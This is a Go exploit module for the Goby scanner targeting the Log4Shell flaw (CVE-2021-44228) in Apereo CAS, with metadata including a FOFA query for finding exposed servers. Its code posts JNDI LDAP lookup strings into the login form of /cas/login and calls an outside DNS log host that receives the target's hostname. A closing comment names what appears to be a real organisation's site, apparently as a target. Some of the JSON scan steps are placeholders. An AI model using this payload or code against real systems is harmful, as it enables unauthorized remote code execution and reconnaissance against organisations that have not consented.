package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"time"
)

func init() {
	expJson := `{
    "Name": "apereo CAS log4j2 RCE vulnerability (CVE-2021-44228)",
    "Description": "<p>apereo CAS is an open source enterprise multilingual single sign-on solution for the Web.</p><p>apereo CAS has a log4shell RCE vulnerability. Attackers can use this vulnerability to execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Product": "apereo CAS",
    "Homepage": "https://github.com/apereo/cas",
    "DisclosureDate": "2021-12-22",
    "Author": "keeeee",
    "FofaQuery": "(body=\"CAS &#8211; Central Authentication Service\")",
    "GobyQuery": "(body=\"CAS &#8211; Central Authentication Service\")",
    "Level": "3",
    "Impact": "<p>Attackers can use this vulnerability to execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>The supplier has released a solution, please upgrade to the new version:<a href=\"https://apereo.github.io/2021/12/11/log4j-vuln/\">https://apereo.github.io/2021/12/11/log4j-vuln/</a></p><p>1. Deploy a web application firewall to monitor database operations.</p><p>2.If not necessary, prohibit public network access to the system.</p> ",
    "Translation": {
        "CN": {
            "Name": "apereo CAS log4j2 命令执行漏洞（CVE-2021-44228）",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ],
            "Description": "<p>apereo CAS&nbsp;是一个开源的用于 Web 的企业多语言单点登录解决方案。</p><p><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">apereo CAS 存在&nbsp;log4shell RCE 漏洞。<span style=\"color: rgb(22, 51, 102); font-size: 16px;\">攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。</span></span><br></p>",
            "Impact": "<p>攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。</p>",
            "Product": "apereo CAS",
            "Recommendation": "<p>⼚商已发布了漏洞方案，请及时关注： <a href=\"https://apereo.github.io/2021/12/11/log4j-vuln/\">https://apereo.github.io/2021/12/11/log4j-vuln/</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>"
        },
        "EN": {
            "Name": "apereo CAS log4j2 RCE vulnerability (CVE-2021-44228)",
            "Product": "apereo CAS",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ],
            "Description": "<p>apereo CAS is an open source enterprise multilingual single sign-on solution for the Web.</p><p>apereo CAS has a log4shell RCE vulnerability. Attackers can use this vulnerability to execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
            "Impact": "<p>Attackers can use this vulnerability to execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
            "Recommendation": "<p>The supplier has released a solution, please upgrade to the new version:<a href=\"https://apereo.github.io/2021/12/11/log4j-vuln/\" target=\"_blank\">https://apereo.github.io/2021/12/11/log4j-vuln/</a></p><p>1. Deploy a web application firewall to monitor database operations.</p><p>2.If not necessary, prohibit public network access to the system.</p> "
        }
    },
    "References": [
        "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228",
        "https://nvd.nist.gov/vuln/detail/CVE-2021-44228",
        "https://apereo.github.io/2021/12/11/log4j-vuln/"
    ],
    "HasExp": true,
    "ExpParams": [
        {
            "name": "dnslog",
            "type": "input",
            "value": "${jndi:ldap://${hostName}.xxx.dnslog.cn}"
        }
    ],
    "ExpTips": null,
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Code Execution"
    ],
    "VulType": [
        "Code Execution"
    ],
    "CVEIDs": [
        "CVE-2021-44228"
    ],
    "CVSSScore": "10.0",
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "CNNVD": [
        "CNNVD-202112-799"
    ],
    "CNVD": [
        "CNVD-2021-95914"
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Is0day": false,
    "PocId": "10246"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			//Godserver
			checkStr := goutils.RandomHexString(4)
			checkUrl, _ := godclient.GetGodLDAPCheckURL("U", checkStr)
			cmd := fmt.Sprintf("${jndi:%s}", checkUrl)
			cmd = url.QueryEscape(cmd)
			uri := "/cas/login"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.Data = fmt.Sprintf("username=%s&password=%s&execution=%s&_eventId=submit&geolocation=", cmd, cmd, cmd)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			if _, err := httpclient.DoHttpRequest(u, cfg); err == nil {
			}
			return godclient.PullExists(checkStr, time.Second*5)

		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["dnslog"].(string)
			cmd = url.QueryEscape(cmd)

			uri := "/cas/login"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.Data = fmt.Sprintf("username=%s&password=%s&execution=%s&_eventId=submit&geolocation=", cmd, cmd, cmd)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			if _, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
			}

			expResult.Output = "see your dnslog"
			expResult.Success = true
			return expResult
		},
	))
}

//https://authentification.ffr.fr
